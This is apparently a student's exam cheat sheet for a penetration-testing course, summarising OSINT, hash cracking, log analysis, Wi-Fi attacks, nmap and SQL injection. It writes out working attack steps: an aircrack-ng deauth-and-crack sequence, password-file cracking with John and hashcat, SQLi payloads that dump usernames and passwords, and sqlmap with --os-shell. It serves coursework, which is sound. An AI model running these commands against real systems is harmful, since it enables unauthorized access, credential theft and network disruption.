# Cyber 448 Midterm — Paper Cheat Sheet

## 1. OSINT (passive!)
`theHarvester -d tgt.com -b google` · `sherlock user` · `whois tgt.com` · `dig tgt.com ANY/MX/TXT` · `dig axfr @ns tgt.com` · `sublist3r -d tgt.com` · `whatweb URL` · `exiftool img.jpg` · `nikto -h URL` (=ACTIVE!)
**Dorks:** `site:` `filetype:` `inurl:` `intitle:` (e.g. `site:tgt.com filetype:pdf`)

## 2. Crypto & Cracking
**Hash IDs:** MD5=32hex · SHA1=40 · SHA256=64 · NTLM=32hex(Windows) · bcrypt=`$2a$`(60) · `$1$`=md5crypt · `$6$`=sha512crypt · `$y$`=yescrypt → use `hashid`
**Rockyou first:** `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
**John:** `unshadow passwd shadow > h` → `john --wordlist=rockyou h` · `john --show h`
`zip2john f.zip > z && john z` · `--rules` mutations · `--format=NT/RAW-MD5/SHA512CRYPT`
**hashcat modes:** MD5=0 · NTLM=1000 · SHA256=1400 · bcrypt=3200 · `$6$`=1800 · WPA=22000
`hashcat -m 0 h.txt rockyou.txt` · `-a 3 ?a?a?a?a` mask (?l ?u ?d ?s ?a) · `--show` · `--force` if GPU fails (or use john)
**Wordlist makers:** `cupp -i` (target profile) · `crunch 8 10 abc123 -o wl` · `cewl -w wl http://tgt`
**CyberChef:** "Magic" autodetects. Base64(`=` pad) / hex(0-9a-f) / ROT13 / XOR Brute / URLdecode / Atbash

## 3. Logs
**Files:** `/var/log/auth.log`(SSH/sudo) · `access.log`(web) · `last`(wtmp) `lastb`(failed) · `journalctl -u ssh`
**THE pattern:** `grep "Failed password" auth.log | awk '{print $NF}' | sort | uniq -c | sort -rn`
`grep "Accepted password" auth.log` (success after many fails = compromise)
**apache log fields:** $1=IP $4=[$time] $6="REQ" $9=status → `awk '{print $9}' | sort | uniq -c`
**Signatures:** SSH brute=many Failed password · scan=one IP many ports fast · dirbust=many 404s then 200 · SQLi=`UNION SELECT`/`'` in URLs · Log4Shell=`${jndi:ldap://`

## 4. Traffic + Wireless
**Wireshark filters:** `ip.addr==1.2.3.4` · `http` · `http.request.method=="POST"`(creds!) · `ftp` · `telnet` · `eapol`(WPA handshake) · `tcp.flags.syn==1 && tcp.flags.ack==0`(SYN scan) · `tcp.stream eq N`
**Right-click → Follow → TCP Stream** · File→Export Objects→HTTP (pull files)
**tcpdump:** `tcpdump -i eth0 -n port 80` · `-w f.pcap` · `-r f.pcap` · `-A` (ascii)
**aircrack-ng suite order:**
```
airmon-ng check kill && airmon-ng start wlan0
airodump-ng wlan0mon                          # find target
airodump-ng wlan0mon --bssid XX -c CH -w cap  # lock + capture
aireplay-ng --deauth 10 -a AP -c CLIENT      # force handshake
aircrack-ng -w rockyou.txt cap-01.cap          # crack
```
OR just `sudo wifite`. **Facts:** need monitor mode first · handshake=4 EAPOL (need msg1-2 or 2-3) · WPA needs wordlist, WEP cracks via IVs · `-c` must match AP channel

## 5. Scanning
```
nmap -sn 10.0.0.0/24                # host discovery only
nmap -sV -sC -T4 -O tgt            # the default combo
nmap -sS (syn/stealth) -sT (full) -sU (udp) -p- (all 65535)
nmap -Pn tgt                        # skip ping (blocked host)
nmap --script vuln tgt              # NSE: --script ftp-anon/smb-vuln*/http-enum
nmap -oN out.txt -oA all tgt
```
**States:** open / closed (RST) / filtered (firewall!) / unfiltered
**Others:** `netdiscover -r 10.0.0.0/24` · `arp-scan --localnet` · `masscan --rate=1000`
SYN scan stealthy = never completes 3-way handshake

## 6. SQLi
```
'                        # error = vuln
' OR 1=1 --              # auth bypass
' UNION SELECT NULL--    # add NULLs till no error = column count
' UNION SELECT version(),user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username,password FROM users--
```
Blind: `AND SLEEP(5)--` · `AND 1=1` vs `AND 1=2`
**sqlmap:** `sqlmap -u "URL?id=1" --batch` · `--forms` · `--data="u=a&p=b"` (POST login) · `-r req.txt` (from Burp)
Escalate: `--dbs` → `-D db --tables` → `-D db -T users --dump` · `--os-shell` · `-p id --level=3`
**Burp/ZAP:** intercept request → save file → `sqlmap -r`

## 7. CLI survival
`grep -i/-v/-c/-rn` · `wc -l` · `sort | uniq -c | sort -rn` · `awk '{print $1}'` · `cut -d: -f1` · `strings f` · `xxd f` · `binwalk -e f` · `base64 -d` · `find / -name "*.pcap" 2>/dev/null` · `ss -tulnp` · `ip a`

## CHECKLIST
[gunzip rockyou] [identify hash b4 tool] [nmap -sV -sC first] [monitor mode b4 airodump] [Follow TCP Stream] [read whole Q for hints]
